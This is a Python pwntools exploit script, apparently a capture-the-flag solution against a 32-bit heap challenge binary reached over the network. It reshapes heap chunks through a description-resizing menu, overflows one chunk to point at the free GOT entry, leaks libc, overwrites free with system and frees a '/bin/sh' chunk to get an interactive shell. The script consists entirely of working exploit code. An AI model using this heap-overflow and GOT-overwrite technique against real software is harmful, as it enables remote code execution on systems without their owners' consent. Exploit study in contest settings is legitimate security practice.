#coding:utf-8

from pwn import *

context.log_level = "debug"

def action(number):
    p.sendlineafter("your choice>> ", str(number))

def add(name, price, descrip_size, description):
    action(1)
    name = name.ljust(15, '\x00')
    p.recvuntil("name:")
    p.send(name)
    p.recvuntil("price:")
    p.send(str(price)+'\n')
    p.recvuntil("descrip_size:")
    p.send(str(descrip_size)+'\n')
    p.recvuntil("description:")
    p.send(description)

def delete(name):
    action(2)
    name = name.ljust(31, '\x00')
    p.recvuntil("name:")
    p.send(name)

def change_desc(name, descrip_size, description):
    action(5)
    name = name.ljust(31, '\x00')
    p.recvuntil("name:")
    p.send(name)
    p.recvuntil("descrip_size:")
    p.send(str(descrip_size)+'\n')
    p.recvuntil("description:")
    p.send(description)

def list_com():
    action(3)

local = 1
if local:
    p = remote("127.0.0.1", 1234)
else:
    p = remote("49.4.23.67", 32604)


raw_input("come on!")

add('a', 0xc, 0x5c, 'a\n')
add('c', 0xc, 0x30, 'c\n')
change_desc('a', 0x1c, 'm'+'\n') # split a's description field into 0x20 and 0x40
add('d', 0xc, 0x3c, 'd\n')       # 0x40 become d's description field
change_desc('d', 0x1c, 'n'+'\n') # split d's description field into 0x20 and 0x20
delete('d')
add('/bin/sh\x00', 0xc, 0x3c, 'e\n')
add('f', 0xc, 0x3c, 'f\n')       # f's header can be modified by a
free_got = 0x804B018
payload = 'a'+'\x00'*27+p32(0x21)+'f'+'\x00'*15+p32(0xc)+p32(0x3c)+p32(free_got)+p32(0x21)+'\n'
change_desc('a', 0x1c, payload)  # change_desc(a) will read 0x5c byte, and change f's description's pointer.

list_com()
p.recvuntil("f: price.12, des.")
free_addr = u32(p.read(4))

if local:
    libc=ELF('/lib/i386-linux-gnu/libc.so.6')
    libc.address = free_addr - libc.symbols['free']
    system_addr = libc.symbols['system']
    info("system address -- {}".format(str(hex(system_addr))))
    # binsh = next(libc.search("/bin/sh")) + libc.address

else:
    libc_base = free_addr - 0x00070750
    system_addr = libc_base + 0x0003a940
    info("system address -- {}".format(str(hex(system_addr))))

change_desc('f', 0x3c, p32(system_addr)+'\n')
delete('/bin/sh\x00')

p.interactive()
